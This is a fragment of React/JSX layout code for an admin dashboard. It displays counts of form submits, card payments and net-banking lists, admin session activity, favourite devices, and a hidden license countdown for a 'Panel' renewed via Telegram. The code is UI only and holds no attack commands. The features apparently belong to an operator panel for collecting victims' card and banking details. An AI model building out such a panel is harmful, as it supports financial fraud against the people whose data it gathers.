          {/* Forms + Activity */}
          <div className="mt-4 grid grid-cols-1 gap-4">
            <SurfaceCard className="overflow-hidden">
              <SectionHeader
                title="All Form Submits"
                right={
                  <button
                    type="button"
                    onClick={goForms}
                    className="zt-btn rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
                  >
                    View Forms ›
                  </button>
                }
              />
              <div className="space-y-3 px-4 py-3">
                <FormRow icon="🗂️" label="Form Submits" value={formsCount} />
                <FormRow icon="💳" label="Card Payments" value={cardCount} />
                <FormRow icon="🏦" label="Net Banking Lists" value={netbankingCount} />
                {error ? <div className="pt-2 text-xs text-rose-600">{error}</div> : null}
              </div>
            </SurfaceCard>

            <SurfaceCard className="overflow-hidden">
              <SectionHeader
                title="Admin Activity"
                right={
                  <div className="flex items-center gap-2">
                    <div className="text-xs text-slate-400">{activityItems.length}</div>
                    <button
                      type="button"
                      onClick={goSessions}
                      className="zt-btn rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
                    >
                      Manage
                    </button>
                  </div>
                }
              />
              <div className="px-4 py-3">
                {activityItems.length === 0 ? (
                  <div className="text-sm text-slate-400">No activity yet.</div>
                ) : (
                  <div className="space-y-2 zt-stagger">
                    {activityItems.map((it) => (
                      <ActivityRow key={it.id} item={it} onClick={goSessions} />
                    ))}
                  </div>
                )}
                {sessionActivity.length === 0 ? (
                  <div className="mt-3 text-[11px] text-slate-400">
                    Tip: If this stays empty, check backend route{" "}
                    <span className="font-mono text-slate-700">GET /api/admin/sessions</span>.
                  </div>
                ) : null}
              </div>
            </SurfaceCard>
          </div>

          {/* Favorites */}
          <SurfaceCard className="mt-4 overflow-hidden">
            <SectionHeader
              title="Favorites"
              right={
                <button
                  type="button"
                  onClick={goFavorites}
                  className="zt-btn rounded-xl border border-slate-200 bg-white px-3 py-1.5 text-xs text-slate-700 hover:bg-slate-50"
                >
                  View All ›
                </button>
              }
            />
            <div className="px-4 py-3">
              {favoritesPreview.length === 0 ? (
                <div className="text-sm text-slate-400">No favorites yet.</div>
              ) : (
                <div className="space-y-2 zt-stagger">
                  {favoritesPreview.map((id) => {
                    const d = deferredDevices.find((x) => x.deviceId === id);
                    return (
                      <FavoriteRow
                        key={id}
                        id={id}
                        device={d}
                        onClick={() => goDevice(id)}
                      />
                    );
                  })}
                </div>
              )}
            </div>
          </SurfaceCard>

          {/* Hidden CountDown — preserved */}
          <div className="hidden">
            <CountDown
              expiryDate={licenseRef.current.expiryISO}
              title="License Countdown"
              subtitle={`Panel: ${licenseRef.current.panelId || "____"}`}
              onRenew={handleRenewClick}
              renewLabel="Renew (Telegram)"
            />
          </div>
        </SurfaceCard>
      </div>
    </AnimatedAppBackground>
  );
}
